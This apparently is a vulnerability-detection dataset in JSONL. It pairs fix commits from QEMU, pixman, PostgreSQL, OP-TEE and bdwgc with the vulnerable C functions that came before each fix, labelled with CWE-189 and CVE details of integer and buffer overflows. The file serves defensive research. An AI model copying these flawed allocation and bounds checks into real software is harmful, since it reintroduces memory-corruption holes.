{"idx": 10413, "project": "qemu", "commit_id": "fe3c546c5ff2a6210f9a4d8561cc64051ca8603e", "project_url": "https://github.com/bonzini/qemu", "commit_url": "https://git.qemu.org/?p=qemu.git;a=commit;h=fe3c546c5ff2a6210f9a4d8561cc64051ca8603e", "commit_message": "usb: check RNDIS buffer offsets & length\n\nWhen processing remote NDIS control message packets,\nthe USB Net device emulator uses a fixed length(4096) data buffer.\nThe incoming informationBufferOffset & Length combination could\noverflow and cross that range. Check control message buffer\noffsets and length to avoid it.\n\nReported-by: Qinghao Tang <luodalongde@gmail.com>\nSigned-off-by: Prasad J Pandit <pjp@fedoraproject.org>\nMessage-id: 1455648821-17340-3-git-send-email-ppandit@redhat.com\nSigned-off-by: Gerd Hoffmann <kraxel@redhat.com>", "target": 1, "func": "static int rndis_query_response(USBNetState *s,\n                rndis_query_msg_type *buf, unsigned int length)\n{\n    rndis_query_cmplt_type *resp;\n    /* oid_supported_list is the largest data reply */\n    uint8_t infobuf[sizeof(oid_supported_list)];\n    uint32_t bufoffs, buflen;\n    int infobuflen;\n    unsigned int resplen;\n \n     bufoffs = le32_to_cpu(buf->InformationBufferOffset) + 8;\n     buflen = le32_to_cpu(buf->InformationBufferLength);\n    if (bufoffs + buflen > length)\n         return USB_RET_STALL;\n \n     infobuflen = ndis_query(s, le32_to_cpu(buf->OID),\n                             bufoffs + (uint8_t *) buf, buflen, infobuf,\n    resplen = sizeof(rndis_query_cmplt_type) +\n            ((infobuflen < 0) ? 0 : infobuflen);\n    resp = rndis_queue_response(s, resplen);\n    if (!resp)\n        return USB_RET_STALL;\n\n    resp->MessageType = cpu_to_le32(RNDIS_QUERY_CMPLT);\n    resp->RequestID = buf->RequestID; /* Still LE in msg buffer */\n    resp->MessageLength = cpu_to_le32(resplen);\n\n    if (infobuflen < 0) {\n        /* OID not supported */\n        resp->Status = cpu_to_le32(RNDIS_STATUS_NOT_SUPPORTED);\n        resp->InformationBufferLength = cpu_to_le32(0);\n        resp->InformationBufferOffset = cpu_to_le32(0);\n        return 0;\n    }\n\n    resp->Status = cpu_to_le32(RNDIS_STATUS_SUCCESS);\n    resp->InformationBufferOffset =\n            cpu_to_le32(infobuflen ? sizeof(rndis_query_cmplt_type) - 8 : 0);\n    resp->InformationBufferLength = cpu_to_le32(infobuflen);\n    memcpy(resp + 1, infobuf, infobuflen);\n\n    return 0;\n}\n", "func_hash": 35868650006871746007884459259388384254, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2016-2538", "cve_desc": "Multiple integer overflows in the USB Net device emulator (hw/usb/dev-network.c) in QEMU before 2.5.1 allow local guest OS administrators to cause a denial of service (QEMU process crash) or obtain sensitive host memory information via a remote NDIS control message packet that is mishandled in the (1) rndis_query_response, (2) rndis_set_response, or (3) usb_net_handle_dataout function.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-2538"}
{"idx": 10414, "project": "qemu", "commit_id": "fe3c546c5ff2a6210f9a4d8561cc64051ca8603e", "project_url": "https://github.com/bonzini/qemu", "commit_url": "https://git.qemu.org/?p=qemu.git;a=commit;h=fe3c546c5ff2a6210f9a4d8561cc64051ca8603e", "commit_message": "usb: check RNDIS buffer offsets & length\n\nWhen processing remote NDIS control message packets,\nthe USB Net device emulator uses a fixed length(4096) data buffer.\nThe incoming informationBufferOffset & Length combination could\noverflow and cross that range. Check control message buffer\noffsets and length to avoid it.\n\nReported-by: Qinghao Tang <luodalongde@gmail.com>\nSigned-off-by: Prasad J Pandit <pjp@fedoraproject.org>\nMessage-id: 1455648821-17340-3-git-send-email-ppandit@redhat.com\nSigned-off-by: Gerd Hoffmann <kraxel@redhat.com>", "target": 1, "func": "static int rndis_set_response(USBNetState *s,\n                rndis_set_msg_type *buf, unsigned int length)\n{\n    rndis_set_cmplt_type *resp =\n            rndis_queue_response(s, sizeof(rndis_set_cmplt_type));\n    uint32_t bufoffs, buflen;\n    int ret;\n\n    if (!resp)\n        return USB_RET_STALL;\n\n \n     bufoffs = le32_to_cpu(buf->InformationBufferOffset) + 8;\n     buflen = le32_to_cpu(buf->InformationBufferLength);\n    if (bufoffs + buflen > length)\n         return USB_RET_STALL;\n \n     ret = ndis_set(s, le32_to_cpu(buf->OID),\n                     bufoffs + (uint8_t *) buf, buflen);\n    resp->MessageLength = cpu_to_le32(sizeof(rndis_set_cmplt_type));\n    if (ret < 0) {\n        /* OID not supported */\n        resp->Status = cpu_to_le32(RNDIS_STATUS_NOT_SUPPORTED);\n        return 0;\n    }\n    resp->Status = cpu_to_le32(RNDIS_STATUS_SUCCESS);\n\n    return 0;\n}\n", "func_hash": 11035841434505204682385490214301101275, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2016-2538", "cve_desc": "Multiple integer overflows in the USB Net device emulator (hw/usb/dev-network.c) in QEMU before 2.5.1 allow local guest OS administrators to cause a denial of service (QEMU process crash) or obtain sensitive host memory information via a remote NDIS control message packet that is mishandled in the (1) rndis_query_response, (2) rndis_set_response, or (3) usb_net_handle_dataout function.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-2538"}
{"idx": 10460, "project": "pixman", "commit_id": "857e40f3d2bc2cfb714913e0cd7e6184cf69aca3", "project_url": "https://cgit.freedesktop.org/pixman/commit/?id=857e40f3d2bc2cfb714913e0cd7e6184cf69aca3", "commit_url": "https://cgit.freedesktop.org/pixman/commit/?id=857e40f3d2bc2cfb714913e0cd7e6184cf69aca3", "commit_message": "None", "target": 1, "func": "create_bits (pixman_format_code_t format,\n             int                  width,\n             int                  height,\n             int *\t\t  rowstride_bytes,\n\t     pixman_bool_t\t  clear)\n{\n    int stride;\n    size_t buf_size;\n    int bpp;\n\n    /* what follows is a long-winded way, avoiding any possibility of integer\n     * overflows, of saying:\n     * stride = ((width * bpp + 0x1f) >> 5) * sizeof (uint32_t);\n     */\n\n    bpp = PIXMAN_FORMAT_BPP (format);\n    if (_pixman_multiply_overflows_int (width, bpp))\n\treturn NULL;\n\n    stride = width * bpp;\n    if (_pixman_addition_overflows_int (stride, 0x1f))\n\treturn NULL;\n\n    stride += 0x1f;\n    stride >>= 5;\n\n    stride *= sizeof (uint32_t);\n\n     if (_pixman_multiply_overflows_size (height, stride))\n \treturn NULL;\n \n    buf_size = height * stride;\n \n     if (rowstride_bytes)\n \t*rowstride_bytes = stride;\n\n    if (clear)\n\treturn calloc (buf_size, 1);\n    else\n\treturn malloc (buf_size);\n}\n", "func_hash": 338189852796356454617405235087008423240, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2014-9766", "cve_desc": "Integer overflow in the create_bits function in pixman-bits-image.c in Pixman before 0.32.6 allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via large height and stride values.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-9766"}
{"idx": 10520, "project": "postgres", "commit_id": "31400a673325147e1205326008e32135a78b4d8a", "project_url": "https://github.com/postgres/postgres", "commit_url": "https://github.com/postgres/postgres/commit/31400a673325147e1205326008e32135a78b4d8a", "commit_message": "Predict integer overflow to avoid buffer overruns.\n\nSeveral functions, mostly type input functions, calculated an allocation\nsize such that the calculation wrapped to a small positive value when\narguments implied a sufficiently-large requirement.  Writes past the end\nof the inadvertent small allocation followed shortly thereafter.\nCoverity identified the path_in() vulnerability; code inspection led to\nthe rest.  In passing, add check_stack_depth() to prevent stack overflow\nin related functions.\n\nBack-patch to 8.4 (all supported versions).  The non-comment hstore\nchanges touch code that did not exist in 8.4, so that part stops at 9.0.\n\nNoah Misch and Heikki Linnakangas, reviewed by Tom Lane.\n\nSecurity: CVE-2014-0064", "target": 1, "func": "hstore_from_array(PG_FUNCTION_ARGS)\n{\n\tArrayType  *in_array = PG_GETARG_ARRAYTYPE_P(0);\n\tint\t\t\tndims = ARR_NDIM(in_array);\n\tint\t\t\tcount;\n\tint32\t\tbuflen;\n\tHStore\t   *out;\n\tPairs\t   *pairs;\n\tDatum\t   *in_datums;\n\tbool\t   *in_nulls;\n\tint\t\t\tin_count;\n\tint\t\t\ti;\n\n\tAssert(ARR_ELEMTYPE(in_array) == TEXTOID);\n\n\tswitch (ndims)\n\t{\n\t\tcase 0:\n\t\t\tout = hstorePairs(NULL, 0, 0);\n\t\t\tPG_RETURN_POINTER(out);\n\n\t\tcase 1:\n\t\t\tif ((ARR_DIMS(in_array)[0]) % 2)\n\t\t\t\tereport(ERROR,\n\t\t\t\t\t\t(errcode(ERRCODE_ARRAY_SUBSCRIPT_ERROR),\n\t\t\t\t\t\t errmsg(\"array must have even number of elements\")));\n\t\t\tbreak;\n\n\t\tcase 2:\n\t\t\tif ((ARR_DIMS(in_array)[1]) != 2)\n\t\t\t\tereport(ERROR,\n\t\t\t\t\t\t(errcode(ERRCODE_ARRAY_SUBSCRIPT_ERROR),\n\t\t\t\t\t\t errmsg(\"array must have two columns\")));\n\t\t\tbreak;\n\n\t\tdefault:\n\t\t\tereport(ERROR,\n\t\t\t\t\t(errcode(ERRCODE_ARRAY_SUBSCRIPT_ERROR),\n\t\t\t\t\t errmsg(\"wrong number of array subscripts\")));\n\t}\n\n\tdeconstruct_array(in_array,\n\t\t\t\t\t  TEXTOID, -1, false, 'i',\n\t\t\t\t\t  &in_datums, &in_nulls, &in_count);\n \n \tcount = in_count / 2;\n \n \tpairs = palloc(count * sizeof(Pairs));\n \n \tfor (i = 0; i < count; ++i)\n\t{\n\t\tif (in_nulls[i * 2])\n\t\t\tereport(ERROR,\n\t\t\t\t\t(errcode(ERRCODE_NULL_VALUE_NOT_ALLOWED),\n\t\t\t\t\t errmsg(\"null value not allowed for hstore key\")));\n\n\t\tif (in_nulls[i * 2 + 1])\n\t\t{\n\t\t\tpairs[i].key = VARDATA_ANY(in_datums[i * 2]);\n\t\t\tpairs[i].val = NULL;\n\t\t\tpairs[i].keylen = hstoreCheckKeyLen(VARSIZE_ANY_EXHDR(in_datums[i * 2]));\n\t\t\tpairs[i].vallen = 4;\n\t\t\tpairs[i].isnull = true;\n\t\t\tpairs[i].needfree = false;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tpairs[i].key = VARDATA_ANY(in_datums[i * 2]);\n\t\t\tpairs[i].val = VARDATA_ANY(in_datums[i * 2 + 1]);\n\t\t\tpairs[i].keylen = hstoreCheckKeyLen(VARSIZE_ANY_EXHDR(in_datums[i * 2]));\n\t\t\tpairs[i].vallen = hstoreCheckValLen(VARSIZE_ANY_EXHDR(in_datums[i * 2 + 1]));\n\t\t\tpairs[i].isnull = false;\n\t\t\tpairs[i].needfree = false;\n\t\t}\n\t}\n\n\tcount = hstoreUniquePairs(pairs, count, &buflen);\n\n\tout = hstorePairs(pairs, count, buflen);\n\n\tPG_RETURN_POINTER(out);\n}\n", "func_hash": 35573989238073479818837185216786718926, "file_name": "hstore_io.c", "file_hash": 316768376712621026413115016118685333491, "cwe": ["CWE-189"], "cve": "CVE-2014-0064", "cve_desc": "Multiple integer overflows in the path_in and other unspecified functions in PostgreSQL before 8.4.20, 9.0.x before 9.0.16, 9.1.x before 9.1.12, 9.2.x before 9.2.7, and 9.3.x before 9.3.3 allow remote authenticated users to have unspecified impact and attack vectors, which trigger a buffer overflow.  NOTE: this identifier has been SPLIT due to different affected versions; use CVE-2014-2669 for the hstore vector.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-0064"}
{"idx": 10521, "project": "postgres", "commit_id": "31400a673325147e1205326008e32135a78b4d8a", "project_url": "https://github.com/postgres/postgres", "commit_url": "https://github.com/postgres/postgres/commit/31400a673325147e1205326008e32135a78b4d8a", "commit_message": "Predict integer overflow to avoid buffer overruns.\n\nSeveral functions, mostly type input functions, calculated an allocation\nsize such that the calculation wrapped to a small positive value when\narguments implied a sufficiently-large requirement.  Writes past the end\nof the inadvertent small allocation followed shortly thereafter.\nCoverity identified the path_in() vulnerability; code inspection led to\nthe rest.  In passing, add check_stack_depth() to prevent stack overflow\nin related functions.\n\nBack-patch to 8.4 (all supported versions).  The non-comment hstore\nchanges touch code that did not exist in 8.4, so that part stops at 9.0.\n\nNoah Misch and Heikki Linnakangas, reviewed by Tom Lane.\n\nSecurity: CVE-2014-0064", "target": 1, "func": "hstore_from_arrays(PG_FUNCTION_ARGS)\n{\n\tint32\t\tbuflen;\n\tHStore\t   *out;\n\tPairs\t   *pairs;\n\tDatum\t   *key_datums;\n\tbool\t   *key_nulls;\n\tint\t\t\tkey_count;\n\tDatum\t   *value_datums;\n\tbool\t   *value_nulls;\n\tint\t\t\tvalue_count;\n\tArrayType  *key_array;\n\tArrayType  *value_array;\n\tint\t\t\ti;\n\n\tif (PG_ARGISNULL(0))\n\t\tPG_RETURN_NULL();\n\n\tkey_array = PG_GETARG_ARRAYTYPE_P(0);\n\n\tAssert(ARR_ELEMTYPE(key_array) == TEXTOID);\n\n\t/*\n\t * must check >1 rather than != 1 because empty arrays have 0 dimensions,\n\t * not 1\n\t */\n\n\tif (ARR_NDIM(key_array) > 1)\n\t\tereport(ERROR,\n\t\t\t\t(errcode(ERRCODE_ARRAY_SUBSCRIPT_ERROR),\n\t\t\t\t errmsg(\"wrong number of array subscripts\")));\n\n\tdeconstruct_array(key_array,\n \t\t\t\t\t  TEXTOID, -1, false, 'i',\n \t\t\t\t\t  &key_datums, &key_nulls, &key_count);\n \n \t/* value_array might be NULL */\n \n \tif (PG_ARGISNULL(1))\n\t{\n\t\tvalue_array = NULL;\n\t\tvalue_count = key_count;\n\t\tvalue_datums = NULL;\n\t\tvalue_nulls = NULL;\n\t}\n\telse\n\t{\n\t\tvalue_array = PG_GETARG_ARRAYTYPE_P(1);\n\n\t\tAssert(ARR_ELEMTYPE(value_array) == TEXTOID);\n\n\t\tif (ARR_NDIM(value_array) > 1)\n\t\t\tereport(ERROR,\n\t\t\t\t\t(errcode(ERRCODE_ARRAY_SUBSCRIPT_ERROR),\n\t\t\t\t\t errmsg(\"wrong number of array subscripts\")));\n\n\t\tif ((ARR_NDIM(key_array) > 0 || ARR_NDIM(value_array) > 0) &&\n\t\t\t(ARR_NDIM(key_array) != ARR_NDIM(value_array) ||\n\t\t\t ARR_DIMS(key_array)[0] != ARR_DIMS(value_array)[0] ||\n\t\t\t ARR_LBOUND(key_array)[0] != ARR_LBOUND(value_array)[0]))\n\t\t\tereport(ERROR,\n\t\t\t\t\t(errcode(ERRCODE_ARRAY_SUBSCRIPT_ERROR),\n\t\t\t\t\t errmsg(\"arrays must have same bounds\")));\n\n\t\tdeconstruct_array(value_array,\n\t\t\t\t\t\t  TEXTOID, -1, false, 'i',\n\t\t\t\t\t\t  &value_datums, &value_nulls, &value_count);\n\n\t\tAssert(key_count == value_count);\n\t}\n\n\tpairs = palloc(key_count * sizeof(Pairs));\n\n\tfor (i = 0; i < key_count; ++i)\n\t{\n\t\tif (key_nulls[i])\n\t\t\tereport(ERROR,\n\t\t\t\t\t(errcode(ERRCODE_NULL_VALUE_NOT_ALLOWED),\n\t\t\t\t\t errmsg(\"null value not allowed for hstore key\")));\n\n\t\tif (!value_nulls || value_nulls[i])\n\t\t{\n\t\t\tpairs[i].key = VARDATA_ANY(key_datums[i]);\n\t\t\tpairs[i].val = NULL;\n\t\t\tpairs[i].keylen = hstoreCheckKeyLen(VARSIZE_ANY_EXHDR(key_datums[i]));\n\t\t\tpairs[i].vallen = 4;\n\t\t\tpairs[i].isnull = true;\n\t\t\tpairs[i].needfree = false;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tpairs[i].key = VARDATA_ANY(key_datums[i]);\n\t\t\tpairs[i].val = VARDATA_ANY(value_datums[i]);\n\t\t\tpairs[i].keylen = hstoreCheckKeyLen(VARSIZE_ANY_EXHDR(key_datums[i]));\n\t\t\tpairs[i].vallen = hstoreCheckValLen(VARSIZE_ANY_EXHDR(value_datums[i]));\n\t\t\tpairs[i].isnull = false;\n\t\t\tpairs[i].needfree = false;\n\t\t}\n\t}\n\n\tkey_count = hstoreUniquePairs(pairs, key_count, &buflen);\n\n\tout = hstorePairs(pairs, key_count, buflen);\n\n\tPG_RETURN_POINTER(out);\n}\n", "func_hash": 39825315315274816115858795994640705454, "file_name": "hstore_io.c", "file_hash": 316768376712621026413115016118685333491, "cwe": ["CWE-189"], "cve": "CVE-2014-0064", "cve_desc": "Multiple integer overflows in the path_in and other unspecified functions in PostgreSQL before 8.4.20, 9.0.x before 9.0.16, 9.1.x before 9.1.12, 9.2.x before 9.2.7, and 9.3.x before 9.3.3 allow remote authenticated users to have unspecified impact and attack vectors, which trigger a buffer overflow.  NOTE: this identifier has been SPLIT due to different affected versions; use CVE-2014-2669 for the hstore vector.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-0064"}
{"idx": 10523, "project": "postgres", "commit_id": "31400a673325147e1205326008e32135a78b4d8a", "project_url": "https://github.com/postgres/postgres", "commit_url": "https://github.com/postgres/postgres/commit/31400a673325147e1205326008e32135a78b4d8a", "commit_message": "Predict integer overflow to avoid buffer overruns.\n\nSeveral functions, mostly type input functions, calculated an allocation\nsize such that the calculation wrapped to a small positive value when\narguments implied a sufficiently-large requirement.  Writes past the end\nof the inadvertent small allocation followed shortly thereafter.\nCoverity identified the path_in() vulnerability; code inspection led to\nthe rest.  In passing, add check_stack_depth() to prevent stack overflow\nin related functions.\n\nBack-patch to 8.4 (all supported versions).  The non-comment hstore\nchanges touch code that did not exist in 8.4, so that part stops at 9.0.\n\nNoah Misch and Heikki Linnakangas, reviewed by Tom Lane.\n\nSecurity: CVE-2014-0064", "target": 1, "func": "hstore_recv(PG_FUNCTION_ARGS)\n{\n\tint32\t\tbuflen;\n\tHStore\t   *out;\n\tPairs\t   *pairs;\n\tint32\t\ti;\n\tint32\t\tpcount;\n\tStringInfo\tbuf = (StringInfo) PG_GETARG_POINTER(0);\n\n\tpcount = pq_getmsgint(buf, 4);\n\n\tif (pcount == 0)\n\t{\n\t\tout = hstorePairs(NULL, 0, 0);\n \t\tPG_RETURN_POINTER(out);\n \t}\n \n \tpairs = palloc(pcount * sizeof(Pairs));\n \n \tfor (i = 0; i < pcount; ++i)\n\t{\n\t\tint\t\t\trawlen = pq_getmsgint(buf, 4);\n\t\tint\t\t\tlen;\n\n\t\tif (rawlen < 0)\n\t\t\tereport(ERROR,\n\t\t\t\t\t(errcode(ERRCODE_NULL_VALUE_NOT_ALLOWED),\n\t\t\t\t\t errmsg(\"null value not allowed for hstore key\")));\n\n\t\tpairs[i].key = pq_getmsgtext(buf, rawlen, &len);\n\t\tpairs[i].keylen = hstoreCheckKeyLen(len);\n\t\tpairs[i].needfree = true;\n\n\t\trawlen = pq_getmsgint(buf, 4);\n\t\tif (rawlen < 0)\n\t\t{\n\t\t\tpairs[i].val = NULL;\n\t\t\tpairs[i].vallen = 0;\n\t\t\tpairs[i].isnull = true;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tpairs[i].val = pq_getmsgtext(buf, rawlen, &len);\n\t\t\tpairs[i].vallen = hstoreCheckValLen(len);\n\t\t\tpairs[i].isnull = false;\n\t\t}\n\t}\n\n\tpcount = hstoreUniquePairs(pairs, pcount, &buflen);\n\n\tout = hstorePairs(pairs, pcount, buflen);\n\n\tPG_RETURN_POINTER(out);\n}\n", "func_hash": 173364060110722756484616438545635738721, "file_name": "hstore_io.c", "file_hash": 316768376712621026413115016118685333491, "cwe": ["CWE-189"], "cve": "CVE-2014-0064", "cve_desc": "Multiple integer overflows in the path_in and other unspecified functions in PostgreSQL before 8.4.20, 9.0.x before 9.0.16, 9.1.x before 9.1.12, 9.2.x before 9.2.7, and 9.3.x before 9.3.3 allow remote authenticated users to have unspecified impact and attack vectors, which trigger a buffer overflow.  NOTE: this identifier has been SPLIT due to different affected versions; use CVE-2014-2669 for the hstore vector.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-0064"}
{"idx": 10524, "project": "postgres", "commit_id": "31400a673325147e1205326008e32135a78b4d8a", "project_url": "https://github.com/postgres/postgres", "commit_url": "https://github.com/postgres/postgres/commit/31400a673325147e1205326008e32135a78b4d8a", "commit_message": "Predict integer overflow to avoid buffer overruns.\n\nSeveral functions, mostly type input functions, calculated an allocation\nsize such that the calculation wrapped to a small positive value when\narguments implied a sufficiently-large requirement.  Writes past the end\nof the inadvertent small allocation followed shortly thereafter.\nCoverity identified the path_in() vulnerability; code inspection led to\nthe rest.  In passing, add check_stack_depth() to prevent stack overflow\nin related functions.\n\nBack-patch to 8.4 (all supported versions).  The non-comment hstore\nchanges touch code that did not exist in 8.4, so that part stops at 9.0.\n\nNoah Misch and Heikki Linnakangas, reviewed by Tom Lane.\n\nSecurity: CVE-2014-0064", "target": 1, "func": "hstoreArrayToPairs(ArrayType *a, int *npairs)\n{\n\tDatum\t   *key_datums;\n\tbool\t   *key_nulls;\n\tint\t\t\tkey_count;\n\tPairs\t   *key_pairs;\n\tint\t\t\tbufsiz;\n\tint\t\t\ti,\n\t\t\t\tj;\n\n\tdeconstruct_array(a,\n\t\t\t\t\t  TEXTOID, -1, false, 'i',\n\t\t\t\t\t  &key_datums, &key_nulls, &key_count);\n\n\tif (key_count == 0)\n\t{\n\t\t*npairs = 0;\n \t\treturn NULL;\n \t}\n \n \tkey_pairs = palloc(sizeof(Pairs) * key_count);\n \n \tfor (i = 0, j = 0; i < key_count; i++)\n\t{\n\t\tif (!key_nulls[i])\n\t\t{\n\t\t\tkey_pairs[j].key = VARDATA(key_datums[i]);\n\t\t\tkey_pairs[j].keylen = VARSIZE(key_datums[i]) - VARHDRSZ;\n\t\t\tkey_pairs[j].val = NULL;\n\t\t\tkey_pairs[j].vallen = 0;\n\t\t\tkey_pairs[j].needfree = 0;\n\t\t\tkey_pairs[j].isnull = 1;\n\t\t\tj++;\n\t\t}\n\t}\n\n\t*npairs = hstoreUniquePairs(key_pairs, j, &bufsiz);\n\n\treturn key_pairs;\n}\n", "func_hash": 9891750996379654953772632249610457461, "file_name": "hstore_op.c", "file_hash": 36855987079836913846262131408621996173, "cwe": ["CWE-189"], "cve": "CVE-2014-0064", "cve_desc": "Multiple integer overflows in the path_in and other unspecified functions in PostgreSQL before 8.4.20, 9.0.x before 9.0.16, 9.1.x before 9.1.12, 9.2.x before 9.2.7, and 9.3.x before 9.3.3 allow remote authenticated users to have unspecified impact and attack vectors, which trigger a buffer overflow.  NOTE: this identifier has been SPLIT due to different affected versions; use CVE-2014-2669 for the hstore vector.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-0064"}
{"idx": 10533, "project": "postgres", "commit_id": "31400a673325147e1205326008e32135a78b4d8a", "project_url": "https://github.com/postgres/postgres", "commit_url": "https://github.com/postgres/postgres/commit/31400a673325147e1205326008e32135a78b4d8a", "commit_message": "Predict integer overflow to avoid buffer overruns.\n\nSeveral functions, mostly type input functions, calculated an allocation\nsize such that the calculation wrapped to a small positive value when\narguments implied a sufficiently-large requirement.  Writes past the end\nof the inadvertent small allocation followed shortly thereafter.\nCoverity identified the path_in() vulnerability; code inspection led to\nthe rest.  In passing, add check_stack_depth() to prevent stack overflow\nin related functions.\n\nBack-patch to 8.4 (all supported versions).  The non-comment hstore\nchanges touch code that did not exist in 8.4, so that part stops at 9.0.\n\nNoah Misch and Heikki Linnakangas, reviewed by Tom Lane.\n\nSecurity: CVE-2014-0064", "target": 1, "func": "path_in(PG_FUNCTION_ARGS)\n{\n\tchar\t   *str = PG_GETARG_CSTRING(0);\n\tPATH\t   *path;\n\tint\t\t\tisopen;\n \tchar\t   *s;\n \tint\t\t\tnpts;\n \tint\t\t\tsize;\n \tint\t\t\tdepth = 0;\n \n \tif ((npts = pair_count(str, ',')) <= 0)\n\t\tereport(ERROR,\n\t\t\t\t(errcode(ERRCODE_INVALID_TEXT_REPRESENTATION),\n\t\t\t\t errmsg(\"invalid input syntax for type path: \\\"%s\\\"\", str)));\n\n\ts = str;\n\twhile (isspace((unsigned char) *s))\n\t\ts++;\n\n\t/* skip single leading paren */\n\tif ((*s == LDELIM) && (strrchr(s, LDELIM) == s))\n\t{\n\t\ts++;\n \t\tdepth++;\n \t}\n \n\tsize = offsetof(PATH, p[0]) +sizeof(path->p[0]) * npts;\n \tpath = (PATH *) palloc(size);\n \n \tSET_VARSIZE(path, size);\n\tpath->npts = npts;\n\n\tif ((!path_decode(TRUE, npts, s, &isopen, &s, &(path->p[0])))\n\t&& (!((depth == 0) && (*s == '\\0'))) && !((depth >= 1) && (*s == RDELIM)))\n\t\tereport(ERROR,\n\t\t\t\t(errcode(ERRCODE_INVALID_TEXT_REPRESENTATION),\n\t\t\t\t errmsg(\"invalid input syntax for type path: \\\"%s\\\"\", str)));\n\n\tpath->closed = (!isopen);\n\t/* prevent instability in unused pad bytes */\n\tpath->dummy = 0;\n\n\tPG_RETURN_PATH_P(path);\n}\n", "func_hash": 185822385736836366672794190569870181445, "file_name": "geo_ops.c", "file_hash": 8157459893315235742326737030500591984, "cwe": ["CWE-189"], "cve": "CVE-2014-0064", "cve_desc": "Multiple integer overflows in the path_in and other unspecified functions in PostgreSQL before 8.4.20, 9.0.x before 9.0.16, 9.1.x before 9.1.12, 9.2.x before 9.2.7, and 9.3.x before 9.3.3 allow remote authenticated users to have unspecified impact and attack vectors, which trigger a buffer overflow.  NOTE: this identifier has been SPLIT due to different affected versions; use CVE-2014-2669 for the hstore vector.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-0064"}
{"idx": 10625, "project": "optee_os", "commit_id": "7e768f8a473409215fe3fff8f6e31f8a3a0103c6", "project_url": "https://github.com/OP-TEE/optee_os", "commit_url": "https://github.com/OP-TEE/optee_os/commit/7e768f8a473409215fe3fff8f6e31f8a3a0103c6", "commit_message": "core: clear the entire TA area\n\nPreviously we cleared (memset to zero) the size corresponding to code\nand data segments, however the allocation for the TA is made on the\ngranularity of the memory pool, meaning that we did not clear all memory\nand because of that we could potentially leak code and data of a\nprevious loaded TA.\n\nFixes: OP-TEE-2018-0006: \"Potential disclosure of previously loaded TA\ncode and data\"\n\nSigned-off-by: Joakim Bech <joakim.bech@linaro.org>\nTested-by: Joakim Bech <joakim.bech@linaro.org> (QEMU v7, v8)\nSuggested-by: Jens Wiklander <jens.wiklander@linaro.org>\nReviewed-by: Jens Wiklander <jens.wiklander@linaro.org>\nReported-by: Riscure <inforequest@riscure.com>\nReported-by: Alyssa Milburn <a.a.milburn@vu.nl>\nAcked-by: Etienne Carriere <etienne.carriere@linaro.org>", "target": 1, "func": "static struct mobj *alloc_ta_mem(size_t size)\n{\n#ifdef CFG_PAGED_USER_TA\n\treturn mobj_paged_alloc(size);\n #else\n \tstruct mobj *mobj = mobj_mm_alloc(mobj_sec_ddr, size, &tee_mm_sec_ddr);\n \n\tif (mobj)\n\t\tmemset(mobj_get_va(mobj, 0), 0, size);\n \treturn mobj;\n #endif\n }\n", "func_hash": 333142874986827667625591185721531467472, "file_name": "user_ta.c", "file_hash": 248720455099417995658472917070540172648, "cwe": ["CWE-189"], "cve": "CVE-2019-1010294", "cve_desc": "Linaro/OP-TEE OP-TEE 3.3.0 and earlier is affected by: Rounding error. The impact is: Potentially leaking code and/or data from previous Trusted Application. The component is: optee_os. The fixed version is: 3.4.0 and later.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2019-1010294"}
{"idx": 10642, "project": "bdwgc", "commit_id": "be9df82919960214ee4b9d3313523bff44fd99e1", "project_url": "https://github.com/ivmai/bdwgc", "commit_url": "https://github.com/ivmai/bdwgc/commit/be9df82919960214ee4b9d3313523bff44fd99e1", "commit_message": "Fix allocation size overflows due to rounding.\n\n* malloc.c (GC_generic_malloc): Check if the allocation size is\nrounded to a smaller value.\n* mallocx.c (GC_generic_malloc_ignore_off_page): Likewise.", "target": 1, "func": "GC_INNER void * GC_generic_malloc_ignore_off_page(size_t lb, int k)\n{\n    void *result;\n    size_t lg;\n    size_t lb_rounded;\n    word n_blocks;\n    GC_bool init;\n    DCL_LOCK_STATE;\n\n    if (SMALL_OBJ(lb))\n         return(GC_generic_malloc((word)lb, k));\n     lg = ROUNDED_UP_GRANULES(lb);\n     lb_rounded = GRANULES_TO_BYTES(lg);\n     n_blocks = OBJ_SZ_TO_BLOCKS(lb_rounded);\n     init = GC_obj_kinds[k].ok_init;\n     if (EXPECT(GC_have_errors, FALSE))\n      GC_print_all_errors();\n    GC_INVOKE_FINALIZERS();\n    LOCK();\n    result = (ptr_t)GC_alloc_large(ADD_SLOP(lb), k, IGNORE_OFF_PAGE);\n    if (0 != result) {\n        if (GC_debugging_started) {\n            BZERO(result, n_blocks * HBLKSIZE);\n        } else {\n#           ifdef THREADS\n              /* Clear any memory that might be used for GC descriptors */\n              /* before we release the lock.                          */\n                ((word *)result)[0] = 0;\n                ((word *)result)[1] = 0;\n                ((word *)result)[GRANULES_TO_WORDS(lg)-1] = 0;\n                ((word *)result)[GRANULES_TO_WORDS(lg)-2] = 0;\n#           endif\n        }\n    }\n    GC_bytes_allocd += lb_rounded;\n    if (0 == result) {\n        GC_oom_func oom_fn = GC_oom_fn;\n        UNLOCK();\n        return((*oom_fn)(lb));\n    } else {\n        UNLOCK();\n        if (init && !GC_debugging_started) {\n            BZERO(result, n_blocks * HBLKSIZE);\n        }\n        return(result);\n    }\n}\n", "func_hash": 174440046177171580621011422434179791291, "file_name": "mallocx.c", "file_hash": 4482882771485867438580536182958100228, "cwe": ["CWE-189"], "cve": "CVE-2012-2673", "cve_desc": "Multiple integer overflows in the (1) GC_generic_malloc and (2) calloc functions in malloc.c, and the (3) GC_generic_malloc_ignore_off_page function in mallocx.c in Boehm-Demers-Weiser GC (libgc) before 7.2 make it easier for context-dependent attackers to perform memory-related attacks such as buffer overflows via a large size value, which causes less memory to be allocated than expected.", "nvd_url": 